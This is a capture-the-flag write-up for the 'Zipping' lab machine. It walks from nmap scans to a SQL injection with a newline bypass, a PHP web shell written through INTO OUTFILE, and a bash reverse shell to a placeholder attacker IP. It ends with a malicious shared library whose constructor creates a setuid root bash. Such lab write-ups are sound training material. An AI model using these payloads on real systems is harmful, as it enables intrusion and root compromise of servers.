

![1](</Writeups/Machines/Zipping/img/logo.png>)
By Rug4lo

## Reconnaissance 

First we start with the typical nmap scan
```bash
nmap -p- --open -T5 -sS -min-rate 5000 -vvv -n -Pn -oG allports 10.10.11.229
```
```bash
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.93 ( https://nmap.org ) at 2023-09-15 18:15 CEST
Initiating SYN Stealth Scan at 18:15
Scanning 10.10.11.229 [65535 ports]
Discovered open port 80/tcp on 10.10.11.229
Discovered open port 22/tcp on 10.10.11.229
Completed SYN Stealth Scan at 18:16, 14.88s elapsed (65535 total ports)
Nmap scan report for 10.10.11.229
Host is up, received user-set (0.10s latency).
Scanned at 2023-09-15 18:15:47 CEST for 15s
Not shown: 65069 closed tcp ports (reset), 464 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack ttl 63
80/tcp open  http    syn-ack ttl 63

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 14.98 seconds
           Raw packets sent: 73404 (3.230MB) | Rcvd: 71641 (2.866MB)
```
Next we run a scan launching some basic reconnaissance scripts 
```bash
nmap -sCV -A -p22,80 -oN targeted 10.10.11.229
```
```bash
# Nmap 7.93 scan initiated Mon Aug 28 19:07:30 2023 as: nmap -sCV -p22,80 -oN target 10.10.11.229
Nmap scan report for 10.10.11.229
Host is up (0.33s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.0p1 Ubuntu 1ubuntu7.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 9d6eec022d0f6a3860c6aaac1ee0c284 (ECDSA)
|_  256 eb9511c7a6faad74aba2c5f6a4021841 (ED25519)
80/tcp open  http    Apache httpd 2.4.54 ((Ubuntu))
|_http-title: Zipping | Watch store
|_http-server-header: Apache/2.4.54 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Mon Aug 28 19:07:46 2023 -- 1 IP address (1 host up) scanned in 16.12 seconds
```
We can see that it has a web page, at first we might think this is a file upload abuse, but it isn't

If we look into the page we will see that there is a watch store section 
```bash
http://10.10.11.229/shop/index.php?page=product&id=2
```

## SQLI

Here we can perform a SQL Injection

If we try a sleep we will see that it doesn't work 
```bash
2'+or+sleep(5)--+-
```
But if we set it up this way we will see that it does work
```bash
%0D%0A%27+or+sleep(5)--+-1
```
Now we can probe around to find the number of columns
```bash
product&id=%0D%0A'+order+by+8--+-1
```
Once we find the number we can see the user running the database and its name
```bash
product&id=%0D%0A'+union+select+1,database(),user(),4,5,6,7,8--+-1
```
You could also go on dumping the information from that database, but it won't hold anything other than the watches

## SQLI to RCE

So we are going to try to execute commands, first we are going to create a PHP file in the folder 
```bash
product&id=%0A%0D'+union select "<?php system($_GET['cmd']);?>",2,3,4,5,6,7,8 into outfile "/dev/shm/script.php" -- -1
```
And then we are going to run it like this 
```bash
index.php?page=/dev/shm/script&cmd=id
```
Now that we have remote command execution we can send ourselves a reverse shell
```bash
?page=/dev/shm/shell&cmd=bash -c "bash -i >%26 /dev/tcp/nuestraip/443 0>%261"
```
With this, if we go to the user's directory we will get the first flag

![1](</Writeups/Machines/Zipping/img/1.png>)

## Privilege escalation

If we run a sudo -l we will see that we have access to a binary as root 
```bash
sudo -l 
```
If we look at the information of that binary with the strings command we can find a password, when we enter it we get access to a few options, which will be of no use to us 

If we keep digging we will see that it may be possible to trace the program's flow
```bash
strace /usr/bin/stock
```
After looking at the program's flow we will see that when the password is entered it tries to load a file that does not exist, we create the file with the .c extension
```bash
#include <stdio.h>
#include <stdlib.h>

static void inject() __attribute__((constructor));

void inject(){
    system("cp /bin/bash /tmp/bash && chmod +s /tmp/bash && /tmp/bash -p");
}
```
And we compile it in the folder where the program is trying to execute it
```bash
gcc -shared -o /home/rektsu/.config/libcounter.so -fPIC [ File.c ]
```
Then we run the binary, and enter the password, this will give us a bash shell as root 